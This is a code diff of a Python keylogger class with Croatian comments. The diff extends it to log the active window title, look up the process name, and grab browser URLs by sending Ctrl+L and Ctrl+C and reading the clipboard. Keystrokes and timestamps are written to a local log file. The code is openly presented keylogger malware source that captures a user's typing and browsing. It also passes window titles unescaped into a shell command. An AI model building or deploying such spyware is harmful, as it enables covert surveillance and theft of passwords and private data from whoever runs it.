@@ -1,14 +1,29 @@
 import subprocess # za instaliranje pynputa ukoliko nije instaliran
 import sys        # za instaliranje pynputa ukoliko nije instaliran
+import datetime
 
 try:
-    from pynput import keyboard 
+    from pynput import keyboard, mouse
+    import pyautogui
+    import pygetwindow as gw
+    import pyperclip
+    import time
 except ImportError:
     subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
-    from pynput import keyboard # pynput se koristi za detekciju pritisnutih tipki
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "pygetwindow"])
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyperclip"])
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "time"])
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyautogui"])
+    from pynput import keyboard, mouse
+    import pyautogui
+    import pygetwindow as gw
+    import pyperclip
+    import time
+
+old_title = ""
 
 class Keylogger:
-
+    
 ##########################################################################################################################################
 
     def __init__(self, log_path):
@@ -64,9 +79,14 @@ class Keylogger:
                 keylogger.char += "⊞"
             elif key == keyboard.Key.backspace:
                 keylogger.delete_last()
+        return False
 
-        # Ažurira log file
-        keylogger.update_log()
+##########################################################################################################################################
+
+    def on_click(x,y,button,pressed):
+        if pressed:
+            keylogger.detect_window_change()
+            return False
 
 ##########################################################################################################################################
 
@@ -84,15 +104,71 @@ class Keylogger:
             content = file.read()
             if content: # ako nije prazan
                 content = content[:-1] # cijeli sadrzaj txt datoteke se kopira osim posljednjeg znaka
+            else:
+                pass
             with open(self.log_path, "w", encoding="utf-8") as file:
                 file.write(content) # zapisi novi sadrzaj
 
 ##########################################################################################################################################
 
     def start(self):
-        with keyboard.Listener(
-                on_press=Keylogger.on_press) as listener:
-            listener.join()
+        while True:
+            self.detect_window_change()
+            with keyboard.Listener(on_press=Keylogger.on_press) as listener:
+                self.detect_window_change()
+                self.update_log()
+                listener.join()
+
+##########################################################################################################################################
+
+    def detect_window_change(self):
+
+        new_title = gw.getActiveWindowTitle()
+        global old_title
+
+        if old_title == new_title:
+            pass
+        elif new_title == "" or new_title == "Task Switching":
+            pass
+        else:
+            with open(self.log_path, "a", encoding="utf-8") as file:
+                            file.write("\n\n__________________________________________________________________________________________________\n"+new_title+"   |"+self.get_imagename_from_PID()+"|   " + str(datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')) + "\nURL: " + self.get_URL() +"\n"+"--------------------------------------------------------------------------------------------------"+"\n")
+            old_title = new_title
+
+##########################################################################################################################################
+
+    def get_imagename_from_PID(self):
+
+        title = gw.getActiveWindowTitle()
+
+        command = f'tasklist /fi "windowtitle eq {title}" /fo "list"'
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        output = result.stdout  # Output iz cmd-a
+        if not output.__contains__('INFO: No tasks are running which match the specified criteria.'):
+            print(output)
+            active_window_name = output[15:].split('\n')[0] # zanemarujem prvih 15 charactera jer je to samo naslov, a splitam po novom redu
+                                                            # i zanemarujem ostatak jer mi nije potreban
+        else:
+            active_window_name = gw.getActiveWindowTitle()
+        return active_window_name
+    
+##########################################################################################################################################
+
+    def get_URL(self):
+
+        browsers = ["brave.exe","msedge.exe","chrome.exe","opera.exe","operagx","firefox.exe"]
+
+        if self.get_imagename_from_PID() in browsers:
+            pyautogui.hotkey('ctrl','l')
+            pyautogui.hotkey('ctrl','c')
+            pyautogui.press('esc')
+            pyautogui.press('esc')
+            pyautogui.press('esc')
+            time.sleep(0.01)
+            url = pyperclip.paste()
+        else:
+            url = ""
+        return url
 
 ##########################################################################################################################################
 
